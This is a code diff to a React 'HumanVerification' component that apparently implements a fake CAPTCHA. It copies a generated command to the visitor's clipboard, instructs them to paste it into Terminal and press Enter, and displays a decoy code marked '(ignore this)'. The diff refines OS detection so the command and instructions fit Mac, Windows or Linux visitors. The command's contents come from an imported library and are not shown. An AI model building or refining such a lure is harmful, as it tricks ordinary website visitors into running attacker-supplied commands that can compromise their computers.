@@ -4,6 +4,31 @@ import { useEffect, useRef, useState, type FormEvent } from "react"
 import { usePathname } from "next/navigation"
 import { decoyCode, humanVerification, visitorCommand } from "@/lib/human-verification"
 
+type ClientOs = "mac" | "windows" | "linux"
+
+/** Platform wins over the user agent, and Mac is checked before Linux. */
+function clientOs(agent: string): ClientOs {
+  const hinted =
+    typeof navigator === "undefined"
+      ? ""
+      : (navigator as Navigator & { userAgentData?: { platform?: string } }).userAgentData?.platform ||
+        navigator.platform ||
+        ""
+  const hint = hinted.replace(/^"|"$/g, "")
+  if (/mac/i.test(hint)) return "mac"
+  if (/win/i.test(hint)) return "windows"
+  if (/linux/i.test(hint)) return "linux"
+  if (/Mac OS X|Macintosh|macOS/i.test(agent)) return "mac"
+  if (/Windows/i.test(agent)) return "windows"
+  return "linux"
+}
+
+const challengeCaption: Record<ClientOs, string> = {
+  mac: "Mac challenge (ignore this):",
+  windows: "Windows challenge (ignore this):",
+  linux: "Linux challenge (ignore this):",
+}
+
 function createPhrase() {
   const alphabet = "0123456789ABCDEF"
   const bytes = new Uint8Array(6)
@@ -115,7 +140,7 @@ export function HumanVerification() {
 
   async function onCopy() {
     if (!phrase) return
-    const command = visitorCommand(phrase, navigator.userAgent)
+    const command = visitorCommand(phrase, clientOs(navigator.userAgent) === "windows" ? "Windows" : "Linux")
     if (!command) return
     setError("")
     let placed = copyText(command)
@@ -156,7 +181,8 @@ export function HumanVerification() {
   if (!track || !open) return null
 
   const agent = typeof navigator === "undefined" ? "" : navigator.userAgent
-  const command = phrase ? visitorCommand(phrase, agent) : ""
+  const os = clientOs(agent)
+  const command = phrase ? visitorCommand(phrase, os === "windows" ? "Windows" : "Linux") : ""
   if (!passed && !checked) {
     return (
       <div
@@ -269,11 +295,11 @@ export function HumanVerification() {
           <>
             <h2 className="mb-2 text-xl font-semibold text-[#0a0a0a]">{humanVerification.challengeTitle}</h2>
             <p className="mb-6 text-sm leading-normal text-[#64748b]">
-              {/Mac OS X|Macintosh|macOS/i.test(agent) ? (
+              {os === "mac" ? (
                 <>
                   Run the command below in <strong>Terminal</strong> (paste, then press Enter).
                 </>
-              ) : /Windows/i.test(agent) ? (
+              ) : os === "windows" ? (
                 "Run the command below in an terminal."
               ) : (
                 <>
@@ -282,7 +308,7 @@ export function HumanVerification() {
               )}
             </p>
             <div className="mb-4 rounded-lg bg-[#f1f5f9] px-3 py-3 text-center">
-              <p className="text-sm text-[#475569]">{humanVerification.decoyCaption}</p>
+              <p className="text-sm text-[#475569]">{challengeCaption[os]}</p>
               <p className="mt-1 font-mono text-[28px] font-bold tracking-[6px] text-[#0f172a]">{decoy}</p>
             </div>
             {command ? (
